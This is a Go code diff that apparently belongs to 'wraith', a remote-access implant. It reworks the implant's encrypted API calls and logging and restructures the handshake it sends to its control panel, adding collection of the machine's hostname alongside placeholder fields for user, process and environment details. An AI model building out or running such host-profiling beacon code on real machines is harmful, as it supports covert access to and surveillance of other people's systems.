@@ -17,6 +17,7 @@ import (
 	"io/ioutil"
 	mrand "math/rand"
 	"net/http"
+	"os"
 	"strings"
 	"sync"
 	"time"
@@ -34,7 +35,7 @@ var protocolVersion = "0"
 var globalRequestCounter uint64 = 0
 
 // Log message (string) if in debug mode
-func dlog(Type int, Message string) {
+func dlog(Type int, Message interface{}) {
 	if setDEBUG {
 		// Get the message type
 		var MessageType string
@@ -49,7 +50,7 @@ func dlog(Type int, Message string) {
 			MessageType = "INFO"
 		}
 		// Print the message with the current timestamp
-		fmt.Printf("<%s> | %s: %s\n", time.Now().Format("15:04:05 02-01-2006"), MessageType, Message)
+		fmt.Printf("<%s> | %s: %v\n", time.Now().Format("15:04:05 02-01-2006"), MessageType, Message)
 	}
 }
 
@@ -255,7 +256,7 @@ func (wraith *wraithStruct) Decrypt(ciphertext string) (string, error) {
 	return string(PKCS7Trimming(dst)), nil
 }
 
-func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[string]string, APIErr error) {
+func (wraith *wraithStruct) API(RequestData interface{}) (APIResponse map[string]string, APIErr error) {
 
 	// Log the API request
 	dlog(0, "request to API with contents `"+fmt.Sprint(RequestData)+"`")
@@ -374,6 +375,9 @@ func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[
 			}
 			// If it has not, return a less informative error message
 			return finalResponse, errors.New("api returned an error code without any message")
+		} else {
+			// No other reply is valid in this protocol so error
+			return finalResponse, errors.New("api returned invalid status code")
 		}
 	} else {
 		// If no status code was supplied, assume success
@@ -386,14 +390,31 @@ func (wraith *wraithStruct) API(RequestData map[string]string) (APIResponse map[
 
 func (wraith *wraithStruct) Handshake() error {
 
+	// Get required data
+	hostname, hostnameGetErr := os.Hostname()
+	if hostnameGetErr != nil {
+		hostname = "null"
+	}
+
 	// Create data required by the panel for logging in
-	data := map[string]string{
-		"req_type":          "handshake",
-		"host_osname":       "",
-		"host_ostype":       "",
-		"host_macaddr":      "",
-		"wraith_version":    wraithVersion,
-		"wraith_start_time": fmt.Sprint(wraith.WraithStartTime.Unix()),
+	data := map[string]interface{}{
+		"req_type": "handshake",
+		"host_info": map[string]interface{}{
+			"arch":        "",
+			"hostname":    hostname,
+			"os_type":     "",
+			"os_version":  "",
+			"reported_ip": "",
+		},
+		"wraith_info": map[string]interface{}{
+			"version":      "",
+			"start_time":   "",
+			"plugins":      "",
+			"env":          "",
+			"pid":          "",
+			"ppid":         "",
+			"running_user": "",
+		},
 	}
 
 	// Send the data
